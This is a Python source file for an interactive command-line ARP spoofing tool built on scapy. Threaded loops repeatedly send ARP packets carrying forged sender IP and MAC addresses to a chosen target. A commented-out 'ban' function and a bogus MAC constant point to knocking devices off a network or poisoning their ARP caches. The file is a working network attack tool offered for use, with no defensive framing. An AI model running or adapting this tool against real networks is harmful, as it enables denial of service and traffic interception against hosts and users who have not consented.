import sys
import os
import scapy.all as scapy
import threading
import time
from enum import Enum
from datetime import datetime
scapy.conf.verb=0;

#test data
IP:str="192.168.50.224";
MAC:str="d8:b1:ee:36:ca:7b"
RECV_IP:str="192.168.50.150";
RECV_MAC:str="b8:27:eb:74:f2:6c";
BAD_MAC:str="33:33:33:33:33:33"

def sendArp(deviceIp,deviceMac, sendToIp,sendToMac)->None:
    arp = scapy.ARP(
        hwtype=0x01,ptype=0x0800,
        hwlen=0x06,plen=0x04,op=1,  # error in plen 0x04, fixed
        hwsrc=deviceMac,
        psrc=deviceIp,
        hwdst=sendToMac,
        pdst=sendToIp
    );
    scapy.send(arp);

class ArpLoop(threading.Thread):
    def __init__(self,deviceIp,deviceMac, sendToIp,sendToMac, interval:float=0.5)->None:
        super().__init__(daemon=True);
        self._exit=threading.Event();
        self.deviceIp=deviceIp;
        self.deviceMac=deviceMac;
        self.sendToIp=sendToIp;
        self.sendToMac=sendToMac;
        self._interval=interval;
    def run(self):
        while not self._exit.is_set():
            sendArp(self.deviceIp,self.deviceMac,self.sendToIp,self.sendToMac);
            time.sleep(self._interval);
    def stop(self):
        self._exit.set();
"""
def ban(deviceIp,deviceMac, ip,mac, interval:float=0.5)->None:
    while True:
        sendArp(deviceIp,deviceMac,ip,mac);
        time.sleep(interval);
"""
class ANSI(Enum):
    END="\033[0m";
    BOLD="\033[1m";
    DIM="\033[2m";
    ITALIC="\033[3m";
    UNDERLINE="\033[4m";
    REVERSE="\033[7m";
    STRIKETHROUGH="\033[9m";
    #colours
    BLACK = "\033[30m"
    MAGENTA = "\033[35m"
    BLUE =  "\033[34m"
    CYAN =  "\033[36m"
    GREEN = "\033[32m"
    RED = "\033[31m"
    YELLOW = "\033[33m"
    PINK = "\033[35m"
    #highlight
    BLACKBG = "\033[40m"
    MAGENTABG = "\033[45m"
    BLUEBG =  "\033[44m"
    CYANBG =  "\033[46m"
    GREENBG = "\033[42m"
    REDBG = "\033[41m"
    YELLOWBG = "\033[43m"
    PINKBG = "\033[45m"

class Display:
    def __init__(self)->None:
        self.prefix:str="";
        self.suffix:str="";
        self.prePrint="";
        self.preInput="";
        self.flush:bool=True
    def print(self,*args):
        listArgs=list(args);
        sys.stdout.write(self.prefix);
        sys.stdout.write(self.prePrint);
        for i,v in enumerate(listArgs):
            listArgs[i]=str(listArgs[i]);
        sys.stdout.write(''.join(listArgs));
        if (self.flush): sys.stdout.flush();
        sys.stdout.write(self.suffix+"\n");  # <---- contains a \n so there is an empty line bewteen every line
        if (self.flush): sys.stdout.flush(); #       The input method creates its own new line when the user 
    def input(self,*args)->str:              #       clicks enter. 
        sys.stdout.write(self.prefix);
        sys.stdout.write(self.preInput);
        listArgs=list(args);
        for i,v in enumerate(listArgs):
            listArgs[i]=str(listArgs[i]);
        sys.stdout.write(''.join(listArgs));
        sys.stdout.flush();
        read:str=sys.stdin.readline();
        sys.stdout.write(self.suffix);
        if (self.flush): sys.stdout.flush();
        return read;

def help()->str:
    return ("""all comands (in order):
            
            \t\t   sudo required for software to run
            \t\t   when adding multiple elements at once seperate with commas and leave no spaces between commas
            \t\t   also try to leave spaces to a minimum
   
            \t\t   set targetip
            \t\t   set targetmac
            \t\t   add fromips
            \t\t   remove fromips
            \t\t   show fromips
            \t\t   add frommacs
            \t\t   remove frommacs
            \t\t   show frommacs
            \t\t   set interval
            \t\t   show interval
            \t\t   start arploop
            \t\t   show arploop
            \t\t   stop arploop
            \t\t   exit"""
        );

def main(argc:int, argv:list[str])->None: # test it against my pi #add somethingg handle duplicates in fromips and frommacs
    if (argc>1):
        if (argv[1]=="--help" or argv[1]=="-h" or argv[1]=="-help"):
            print(help());
            return;

    COLOUR=ANSI.CYANBG.value+ANSI.BLACK.value;
    disp=Display();
    disp.prefix=f"{COLOUR}{datetime.now().strftime("%H:%M:%S")}||{ANSI.BOLD.value}{scapy.get_if_addr(scapy.conf.iface)}{ANSI.END.value}{COLOUR} >> {ANSI.END.value}";
    disp.suffix=f"{ANSI.END.value}\n";
    disp.prePrint=f"{ANSI.DIM.value}";
    disp.preInput=f"{ANSI.BOLD.value}";
    disp.print("Send Arp Packets, Welcome");

    targetIp:str="";
    targetMac:str="";
    fromIp:list[str]=[];
    fromMac:list[str]=[];
    arpThreads:list[ArpLoop]=[];
    intervalBetweenArpPackets:float=0.1;
    while True:
        # reset the display prefix every tick because... i dont know how to update any dynamically?
        disp.prefix=f"{COLOUR}{datetime.now().strftime("%H:%M:%S")}||{ANSI.BOLD.value}{scapy.get_if_addr(scapy.conf.iface)}{ANSI.END.value}{COLOUR} >> {ANSI.END.value}";
        userInput=disp.input();
        if (userInput[:-1]=="exit" or userInput[:-1]=="quit"):
            break;
        if (userInput[:-1]=="help"):
            disp.print(help());
        
        elif (userInput[0:13]=="set targetip "):
            targetIp=userInput[13:-1];
            disp.print("target ip set to ", targetIp);
        elif (userInput[0:13]=="show targetip"):
            disp.print(targetIp);
        
        elif (userInput[0:14]=="set targetmac "):
            targetMac=userInput[14:-1];
            disp.print("target mac set to ", targetMac);
        elif (userInput[0:14]=="show targetmac"):
            disp.print(targetMac);        
        elif (userInput[0:-1]==":3"):
            disp.print(">w<");
        
        elif (userInput[0:12]=="add fromips "):
            if (len(userInput[12:-1].split(','))>1):
                fromIp.extend(userInput[12:-1].split(','));
                disp.print("Added IPs, ",userInput[12:-1].split(','));
                continue;
            fromIp.append(userInput[12:-1]);
            disp.print("Added IP, ",userInput[12:-1]); # :-1 remove last character, which is the carrige return
        elif (userInput[0:14]=="remove fromips"):
            #print(userInput[16:-1]);
            if (len(userInput[15:-1].split(','))>1):
                fromIp=[x for x in fromIp if x not in userInput[15:-1].split(',')];
                continue;
            if (userInput[15:-1]=="*"): 
                fromIp.clear();
                continue;
            fromIp.remove(userInput[15:-1]);
        elif (userInput[0:12]=="show fromips"):
            disp.print("Sender IPs,\n\t\t\t >",'\n\t\t\t >'.join(fromIp));
        elif (userInput[0:-1]=="clear fromips"):
            fromIp.clear();
        
        elif (userInput[0:13]=="add frommacs "):
            if (len(userInput[13:-1].split(','))>1):
                fromMac.extend(userInput[13:-1].split(','));
                disp.print("Added macs, ",userInput[13:-1].split(','));
                continue;
            fromMac.append(userInput[13:-1]);
            disp.print("Added mac, ",userInput[13:-1]);
        elif (userInput[0:15]=="remove frommacs"):
            #print(len(userInput[16:-1].split(',')));
            if (len(userInput[16:-1].split(','))>1):
                fromMac=[x for x in fromMac if x not in userInput[16:-1].split(',')];
                continue;
            if (userInput[16:-1]=="*"): 
                fromMac.clear();
                continue;
            fromMac.remove(userInput[16:-1]);
        elif (userInput[0:13]=="show frommacs"):
            disp.print("Sender macs,\n\t\t\t  > ",str('\n\t\t\t  > '.join(fromMac)));
        elif (userInput[0:-1]=="clear frommacs"):
            fromMac.clear();

        elif (userInput[0:13]=="set interval "):
            intervalBetweenArpPackets=float(userInput[13:-1]);
        elif (userInput[0:13]=="show interval"):
            disp.print(intervalBetweenArpPackets);
        
        elif (userInput[:-1]=="start arploop"):
            for i,v in enumerate(fromIp):
                arpThreads.append(ArpLoop(fromIp[i],fromMac[i],targetIp,targetMac,interval=intervalBetweenArpPackets));
                arpThreads[i].start();
        elif (userInput[:-1]=="show arploop"):
            out:list[str]=[];
            for i in arpThreads:
                out.append(f"{i}");
            disp.print("Display arp loops:","\n\t\t\t   ","\n\t\t\t   ".join(out));
        elif (userInput[:-1]=="stop arploop"):
            for i,v in enumerate(arpThreads):
                arpThreads[i].stop();
            arpThreads.clear();

        else:
            disp.print(f"{ANSI.END.value}{ANSI.RED.value}Command: '{userInput[:-1]}' not found{ANSI.END.value}");

    #sendArp(IP,MAC,RECV_IP,RECV_MAC);
    #test=ArpLoop(IP,MAC,RECV_IP,RECV_MAC,interval=0.01);
    #test.start();
    #time.sleep(5);
    #test.stop();
if(__name__=="__main__"): main(len(sys.argv),sys.argv);